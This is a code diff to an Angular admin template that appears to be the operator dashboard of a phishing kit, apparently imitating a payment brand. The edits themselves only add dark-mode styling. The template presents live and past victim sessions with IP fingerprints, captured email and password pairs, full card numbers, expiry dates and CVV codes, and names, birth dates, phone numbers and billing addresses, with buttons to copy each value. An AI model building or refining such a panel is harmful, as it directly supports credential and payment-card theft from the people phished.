@@ -591,14 +591,14 @@ type AdminTab = 'live' | 'history' | 'settings';
                <!-- Backdrop -->
                <div class="absolute inset-0 bg-black/20 backdrop-blur-sm transition-opacity" (click)="closeHistory()"></div>
                <!-- Panel -->
-               <div class="relative w-full max-w-2xl bg-white h-full shadow-2xl flex flex-col animate-slide-in-right">
-                   <div class="p-6 border-b border-slate-100 flex justify-between items-center bg-slate-50/50">
-                       <h2 class="font-bold text-xl text-pp-navy">Session History Details</h2>
-                       <button (click)="closeHistory()" class="p-2 hover:bg-slate-200 text-slate-500 rounded-full transition-colors">
+               <div class="relative w-full max-w-[90vw] md:max-w-[1200px] bg-white dark:bg-slate-800 h-full shadow-2xl flex flex-col animate-slide-in-right">
+                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-slate-50/50 dark:bg-slate-800/95">
+                       <h2 class="font-bold text-xl text-pp-navy dark:text-white">Session History Details</h2>
+                       <button (click)="closeHistory()" class="p-2 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-500 dark:text-slate-400 rounded-full transition-colors">
                            <span class="material-icons">close</span>
                        </button>
                    </div>
-                   <div class="flex-1 overflow-y-auto bg-[#F9FAFB] flex flex-col">
+                   <div class="flex-1 overflow-y-auto bg-[#F9FAFB] dark:bg-slate-900 flex flex-col">
                         <ng-container *ngTemplateOutlet="sessionDetailView; context: {session: selectedHistorySession(), isHistory: true}"></ng-container>
                    </div>
                </div>
@@ -608,13 +608,13 @@ type AdminTab = 'live' | 'history' | 'settings';
       <!-- Reusable Session Detail Template -->
       <ng-template #sessionDetailView let-session="session" let-isHistory="isHistory">
             <!-- Header -->
-            <div class="p-6 border-b border-slate-100 flex justify-between items-center bg-white/50 shrink-0">
+            <div class="p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-white/50 dark:bg-slate-800/90 shrink-0">
                 <div>
                     <div class="flex items-center gap-3 mb-1">
-                    <h2 class="font-bold text-xl text-pp-navy">Session Details</h2>
+                    <h2 class="font-bold text-xl text-pp-navy dark:text-white">Session Details</h2>
                     <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ session?.stage }}</span>
                     </div>
-                    <p class="text-xs text-slate-500 font-mono">{{ session?.id }} • {{ session?.fingerprint?.ip }}</p>
+                    <p class="text-xs text-slate-500 dark:text-slate-400 font-mono">{{ session?.id }} • {{ session?.fingerprint?.ip }}</p>
                 </div>
                 @if(!isHistory) {
                     <div class="text-right">
@@ -629,26 +629,26 @@ type AdminTab = 'live' | 'history' | 'settings';
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-6 pb-20">
 
                     <!-- Credentials -->
-                    <div class="bg-white p-6 rounded-[16px] shadow-sm border border-slate-200 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
-                        <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy">lock</span></div>
+                    <div class="bg-white dark:bg-slate-800 p-6 rounded-[16px] shadow-sm border border-slate-200 dark:border-slate-700 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
+                        <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy dark:text-white">lock</span></div>
 
-                        <div class="flex items-center gap-2 mb-6 border-b border-slate-100 pb-3">
-                            <div class="bg-blue-50 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">vpn_key</span></div>
-                            <h4 class="text-sm font-bold text-pp-navy uppercase tracking-tight">Login Credentials</h4>
+                        <div class="flex items-center gap-2 mb-6 border-b border-slate-100 dark:border-slate-700 pb-3">
+                            <div class="bg-blue-50 dark:bg-blue-900/30 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">vpn_key</span></div>
+                            <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">Login Credentials</h4>
                         </div>
 
                         <div class="space-y-5 relative z-10">
                             <div>
                                 <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Email / Username</label>
-                                <div class="flex items-center gap-2 bg-slate-50 p-2 rounded-lg border border-slate-100">
-                                    <p class="text-sm font-bold text-pp-navy break-all flex-1">{{ session?.data?.email || '...' }}</p>
+                                <div class="flex items-center gap-2 bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
+                                    <p class="text-sm font-bold text-pp-navy dark:text-white break-all flex-1">{{ session?.data?.email || '...' }}</p>
                                     <button *ngIf="session?.data?.email" (click)="copy(session?.data?.email)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                 </div>
                             </div>
                             <div>
                                 <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Password</label>
-                                <div class="flex items-center gap-2 bg-slate-50 p-2 rounded-lg border border-slate-100">
-                                    <p class="text-sm font-mono text-pp-navy flex-1">{{ session?.data?.password || '...' }}</p>
+                                <div class="flex items-center gap-2 bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
+                                    <p class="text-sm font-mono text-pp-navy dark:text-white flex-1">{{ session?.data?.password || '...' }}</p>
                                     <button *ngIf="session?.data?.password" (click)="copy(session?.data?.password)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                 </div>
                             </div>
@@ -656,12 +656,12 @@ type AdminTab = 'live' | 'history' | 'settings';
                     </div>
 
                     <!-- Financial -->
-                    <div class="bg-white p-6 rounded-[16px] shadow-sm border border-slate-200 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
-                        <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy">credit_card</span></div>
+                    <div class="bg-white dark:bg-slate-800 p-6 rounded-[16px] shadow-sm border border-slate-200 dark:border-slate-700 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
+                        <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy dark:text-white">credit_card</span></div>
 
-                        <div class="flex items-center gap-2 mb-6 border-b border-slate-100 pb-3">
-                            <div class="bg-blue-50 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">payment</span></div>
-                            <h4 class="text-sm font-bold text-pp-navy uppercase tracking-tight">Financial Instrument</h4>
+                        <div class="flex items-center gap-2 mb-6 border-b border-slate-100 dark:border-slate-700 pb-3">
+                            <div class="bg-blue-50 dark:bg-blue-900/30 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">payment</span></div>
+                            <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">Financial Instrument</h4>
                         </div>
 
                         <div class="space-y-5 relative z-10">
@@ -672,21 +672,21 @@ type AdminTab = 'live' | 'history' | 'settings';
                                         <img [src]="getCardLogoUrl(session?.data?.cardType)" class="h-4 w-auto object-contain">
                                     }
                                 </div>
-                                <div class="flex items-center gap-2 bg-slate-50 p-2 rounded-lg border border-slate-100">
-                                   <p class="text-lg font-mono font-bold text-pp-navy tracking-wide flex-1">{{ formatCard(session?.data?.cardNumber) }}</p>
+                                <div class="flex items-center gap-2 bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
+                                   <p class="text-lg font-mono font-bold text-pp-navy dark:text-white tracking-wide flex-1">{{ formatCard(session?.data?.cardNumber) }}</p>
                                    <button *ngIf="session?.data?.cardNumber" (click)="copy(session?.data?.cardNumber)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                 </div>
                             </div>
                             <div class="grid grid-cols-2 gap-4">
                                 <div>
                                     <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Expiry</label>
-                                    <div class="bg-slate-50 p-2 rounded-lg border border-slate-100">
-                                        <p class="font-bold text-pp-navy text-sm">{{ session?.data?.cardExpiry || '--/--' }}</p>
+                                    <div class="bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
+                                        <p class="font-bold text-pp-navy dark:text-white text-sm">{{ session?.data?.cardExpiry || '--/--' }}</p>
                                     </div>
                                 </div>
                                 <div>
                                     <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">CVV / CSC</label>
-                                    <div class="bg-slate-50 p-2 rounded-lg border border-slate-100">
+                                    <div class="bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
                                         <p class="font-bold text-[#D92D20] text-sm">{{ session?.data?.cardCvv || '---' }}</p>
                                     </div>
                                 </div>
@@ -742,32 +742,32 @@ type AdminTab = 'live' | 'history' | 'settings';
                     </div>
 
                     <!-- Identity Info (Full Width) -->
-                    <div class="col-span-1 md:col-span-2 bg-white p-6 rounded-[16px] shadow-sm border border-slate-200">
-                            <div class="flex items-center gap-2 mb-6 border-b border-slate-100 pb-3">
-                                <div class="bg-blue-50 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">badge</span></div>
-                                <h4 class="text-sm font-bold text-pp-navy uppercase tracking-tight">Identity Profile</h4>
+                    <div class="col-span-1 md:col-span-2 bg-white dark:bg-slate-800 p-6 rounded-[16px] shadow-sm border border-slate-200 dark:border-slate-700">
+                            <div class="flex items-center gap-2 mb-6 border-b border-slate-100 dark:border-slate-700 pb-3">
+                                <div class="bg-blue-50 dark:bg-blue-900/30 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">badge</span></div>
+                                <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">Identity Profile</h4>
                             </div>
 
                             <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
                                 <div>
                                     <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Legal Name</label>
-                                    <p class="text-sm font-bold text-pp-navy">{{ (session?.data?.firstName + ' ' + session?.data?.lastName).trim() || 'Waiting...' }}</p>
+                                    <p class="text-sm font-bold text-pp-navy dark:text-white">{{ (session?.data?.firstName + ' ' + session?.data?.lastName).trim() || 'Waiting...' }}</p>
                                 </div>
                                 <div>
                                     <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Date of Birth</label>
-                                    <p class="text-sm font-bold text-pp-navy">{{ session?.data?.dob || 'Waiting...' }}</p>
+                                    <p class="text-sm font-bold text-pp-navy dark:text-white">{{ session?.data?.dob || 'Waiting...' }}</p>
                                 </div>
                                 <div>
                                     <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Phone Number</label>
-                                    <p class="text-sm font-bold text-pp-navy">{{ session?.data?.phoneNumber || 'Waiting...' }}</p>
+                                    <p class="text-sm font-bold text-pp-navy dark:text-white">{{ session?.data?.phoneNumber || 'Waiting...' }}</p>
                                 </div>
                                 <div>
                                     <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Location</label>
-                                    <p class="text-sm font-bold text-pp-navy">{{ session?.data?.country || 'Waiting...' }}</p>
+                                    <p class="text-sm font-bold text-pp-navy dark:text-white">{{ session?.data?.country || 'Waiting...' }}</p>
                                 </div>
                                 <div class="col-span-2 md:col-span-4">
                                     <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Billing Address</label>
-                                    <p class="text-sm font-bold text-pp-navy bg-slate-50 p-3 rounded-lg border border-slate-100">{{ session?.data?.address || 'Waiting...' }}</p>
+                                    <p class="text-sm font-bold text-pp-navy dark:text-white bg-slate-50 dark:bg-slate-900/50 p-3 rounded-lg border border-slate-100 dark:border-slate-700">{{ session?.data?.address || 'Waiting...' }}</p>
                                 </div>
                             </div>
                     </div>
@@ -777,7 +777,7 @@ type AdminTab = 'live' | 'history' | 'settings';
 
             <!-- Action Bar -->
             @if(!isHistory) {
-                <div class="p-5 border-t border-slate-200 bg-white sticky bottom-0 z-20 flex justify-between items-center shadow-lg lg:shadow-none">
+                <div class="p-5 border-t border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800 sticky bottom-0 z-20 flex justify-between items-center shadow-lg lg:shadow-none">
                     <div class="flex items-center gap-2">
                         <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(session)" [class.bg-pp-success]="isSessionLive(session)" [class.bg-slate-300]="!isSessionLive(session)"></span>
                         <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(session) ? 'Live Connection' : 'Offline' }}</span>
